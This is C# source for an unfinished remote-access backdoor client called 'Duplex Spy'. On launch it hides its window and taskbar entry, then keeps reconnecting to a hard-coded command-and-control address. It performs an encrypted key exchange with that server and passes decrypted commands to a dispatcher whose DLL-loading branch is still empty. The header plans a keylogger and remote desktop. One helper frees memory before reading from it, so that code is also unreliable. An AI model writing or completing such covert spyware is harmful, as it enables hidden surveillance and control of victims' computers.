/* .o0o.--------------[ README ]--------------.o0o.
 * # INTRODUCTION
 * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V1.0.0
 * AUTHOR: ISSAC
 * LANGUAGE: C#
 * 
 * # DONE
 * SEND INFORMATION
 * 
 * 
 * [ TODO LIST ]
 * KEYLOGGER
 * REMOTE PLUGIN
 * 
 * REMOTE DESKTOP
 * 
 * FILE MANAGER
 * TASK MANAGER
 * CONNECTION MANAGER
 * SERVICE MANAGER
 * WINDOW MANAGER
 * 
 * .o0o.--------------[ README ]--------------.o0o. */

using System;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Reflection;
using winClient48Small;
using System.IO;
using System.Runtime.InteropServices;

namespace winClient48
{
    public partial class Form1 : Form
    {
        private Socket g_Socket;
        private bool g_bConnected = false;

        private string g_szIPAddr = "127.0.0.1";
        private int g_nPort = 5000;

        private int g_nTimeout = 10000; //ms
        private int g_nRetry = 10000; //ms

        public Form1()
        {
            InitializeComponent();
        }

        private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }
        private byte[] StructToBytes<T>(T structure) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            byte[] buffer = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(structure, ptr, false);
                Marshal.Copy(ptr, buffer, 0, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return buffer;
        }
        private T BytesToStruct<T>(byte[] buffer) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            if (buffer.Length != size)
            {
                throw new ArgumentException("Byte array size does not match the size of the structure.");
            }

            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.Copy(buffer, 0, ptr, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return Marshal.PtrToStructure<T>(ptr);
        }

        void ReceivedBuffer(Server s)
        {
            //Assembly assembly = Assembly.Load(abDll);
            try
            {
                Socket socket = s.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Server.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                s.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Server.MAX_BUFFER_LENGTH];
                    recv_len = s.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);
                            if (dsp.Command == 0)
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {
                                    Disconnect();
                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {
                                    Reconnect();
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    s.tpRsaKeyPair.szXmlPublicKey = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    s.tpAesKey.abKey = Convert.FromBase64String(aes.key);
                                    s.tpAesKey.abIV = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    s.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, s.tpRsaKeyPair.szXmlPublicKey));
                                    payload = Crypto.AESEncrypt(payload, s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    s.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    //new Thread(() => SendInfo(v)).Start();
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), s.tpAesKey.abKey, s.tpAesKey.abIV);
                                    CommandProc(s, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    s.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && g_bConnected);
            }
            catch (Exception ex)
            {
                g_bConnected = false;
                return;
            }
        }
        void CommandProc(Server s, string szPayload)
        {
            string[] aCmd = szPayload.Split('|');
            if (aCmd[0] == "dll")
            {
                if (aCmd[1] == "ls")
                {

                }
                else if (aCmd[1] == "load")
                {

                }
            }
        }

        void Reconnect()
        {

        }
        void Disconnect()
        {

        }

        bool Connect(string szIPAddr, int nPort)
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.ReceiveTimeout = sock.SendTimeout = g_nTimeout;
                sock.Connect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort));

                Server s = new Server(sock);
                new Thread(() => ReceivedBuffer(s)).Start();
                g_bConnected = true;

                g_Socket = sock;

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        void Main()
        {
            g_bConnected = false;
            while (true)
            {
                if (!g_bConnected)
                {
                    g_bConnected = Connect(g_szIPAddr, g_nPort);
                }

                Thread.Sleep(g_nRetry);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Main();
        }
    }
}